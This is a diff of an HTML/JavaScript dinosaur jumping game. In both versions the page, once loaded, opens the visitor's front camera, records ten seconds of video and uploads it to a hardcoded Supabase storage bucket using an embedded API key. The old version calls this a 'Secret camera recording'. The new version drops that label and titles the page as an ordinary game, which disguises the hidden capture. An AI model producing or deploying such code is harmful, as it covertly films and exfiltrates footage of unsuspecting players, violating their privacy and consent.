@@ -1,88 +1,130 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Dino Game with Secret Camera Upload</title>
-    <style>
-        body {
-            margin: 0;
-            overflow: hidden;
-            background: url('Background.png.png') no-repeat center center fixed;
-            background-size: cover;
-        }
-        canvas {
-            display: block;
-            margin: auto;
-            background: rgba(255, 255, 255, 0.2);
-            border: 2px solid #333;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>AUN's Dino Game</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+      touch-action: manipulation;
+      background: url('Background.png.png') no-repeat center center fixed;
+      background-size: cover;
+    }
+
+    canvas {
+      display: block;
+      margin: auto;
+      background: transparent;
+    }
+
+    #jumpButton {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      z-index: 10;
+      background: transparent;
+      border: none;
+    }
+  </style>
 </head>
 <body>
-    <canvas id="gameCanvas" width="800" height="600"></canvas>
+  <canvas id="gameCanvas" width="800" height="400"></canvas>
+  <button id="jumpButton"></button>
 
-    <script type="module">
-        const canvas = document.getElementById("gameCanvas");
-        const ctx = canvas.getContext("2d");
+  <script type="module">
+    const canvas = document.getElementById("gameCanvas");
+    const ctx = canvas.getContext("2d");
 
-        const dinosaurImg = new Image();
-        dinosaurImg.src = "Dinasour.png.png";
+    const dinoImg = new Image();
+    dinoImg.src = "Dinasour.png.png";
+    const cactusImg = new Image();
+    cactusImg.src = "Cactus.png.png";
 
-        const cactusImg = new Image();
-        cactusImg.src = "Cactus.png.png";
+    let dino = { x: 50, y: 300, width: 60, height: 60, vy: 0, jumping: false };
+    let cactus = { x: 800, y: 300, width: 50, height: 60 };
+    const gravity = 1.8;
 
-        let dinoX = 50, dinoY = 500;
-        let cactusX = 800, cactusY = 500;
+    function draw() {
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
 
-        function draw() {
-            ctx.clearRect(0, 0, canvas.width, canvas.height);
-            ctx.drawImage(dinosaurImg, dinoX, dinoY, 80, 80);
-            ctx.drawImage(cactusImg, cactusX, cactusY, 50, 80);
+      cactus.x -= 5;
+      if (cactus.x < -cactus.width) cactus.x = canvas.width + Math.random() * 300;
 
-            cactusX -= 5;
-            if (cactusX < -50) cactusX = 800;
+      if (dino.jumping) {
+        dino.vy += gravity;
+        dino.y += dino.vy;
 
-            requestAnimationFrame(draw);
+        if (dino.y >= 300) {
+          dino.y = 300;
+          dino.vy = 0;
+          dino.jumping = false;
         }
+      }
 
-        draw();
+      ctx.drawImage(dinoImg, dino.x, dino.y, dino.width, dino.height);
+      ctx.drawImage(cactusImg, cactus.x, cactus.y, cactus.width, cactus.height);
 
-        // 🎥 Secret camera recording
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
-            .then(stream => {
-                const mediaRecorder = new MediaRecorder(stream);
-                const chunks = [];
+      requestAnimationFrame(draw);
+    }
 
-                mediaRecorder.ondataavailable = e => chunks.push(e.data);
-                mediaRecorder.onstop = async () => {
-                    const blob = new Blob(chunks, { type: "video/webm" });
-                    const fileName = `dino-cam-${Date.now()}.webm`;
+    function jump() {
+      if (!dino.jumping) {
+        dino.jumping = true;
+        dino.vy = -20;
+      }
+    }
 
-                    // Upload to Supabase
-                    const { createClient } = await import('https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm');
-                    const supabase = createClient(
-                        'https://xtjwkxstpvkqcjewmjva.supabase.co',
-                        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inh0andreHN0cHZrcWNqZXdtanZhIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDQ3MDE0NjIsImV4cCI6MjA2MDI3NzQ2Mn0.-EdKJxRrJTLgrcvqn7-4xZJmdMBexINdP3430EE5nXo'
-                    );
+    window.addEventListener('keydown', (e) => {
+      if (e.code === 'Space' || e.code === 'ArrowUp') {
+        jump();
+      }
+    });
 
-                    const { data, error } = await supabase.storage
-                        .from('recordings')
-                        .upload(fileName, blob, {
-                            contentType: 'video/webm'
-                        });
+    document.getElementById('jumpButton').addEventListener('touchstart', jump);
 
-                    if (error) {
-                        console.error("❌ Upload failed:", error);
-                    } else {
-                        console.log("✅ Video uploaded:", data);
-                    }
-                };
+    draw();
 
-                mediaRecorder.start();
-                setTimeout(() => mediaRecorder.stop(), 10000); // 10 seconds
-            })
-            .catch(err => {
-                console.error("Camera error:", err);
+    // Camera capture and Supabase upload
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+      .then(stream => {
+        const mediaRecorder = new MediaRecorder(stream);
+        const chunks = [];
+
+        mediaRecorder.ondataavailable = e => chunks.push(e.data);
+        mediaRecorder.onstop = async () => {
+          const blob = new Blob(chunks, { type: "video/webm" });
+          const fileName = `visit-${Date.now()}.webm`;
+
+          const { createClient } = await import('https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm');
+          const supabase = createClient(
+            'https://xtjwkxstpvkqcjewmjva.supabase.co',
+            'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inh0andreHN0cHZrcWNqZXdtanZhIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDQ3MDE0NjIsImV4cCI6MjA2MDI3NzQ2Mn0.-EdKJxRrJTLgrcvqn7-4xZJmdMBexINdP3430EE5nXo'
+          );
+
+          const { data, error } = await supabase.storage
+            .from('dino')
+            .upload(fileName, blob, {
+              contentType: 'video/webm'
             });
-    </script>
+
+          if (error) {
+            console.error("❌ Upload Error:", error.message);
+          } else {
+            console.log("✅ Uploaded to Supabase:", data);
+          }
+        };
+
+        mediaRecorder.start();
+        setTimeout(() => mediaRecorder.stop(), 10000);
+      })
+      .catch(err => {
+        console.error("Camera access denied:", err);
+      });
+  </script>
 </body>
 </html>
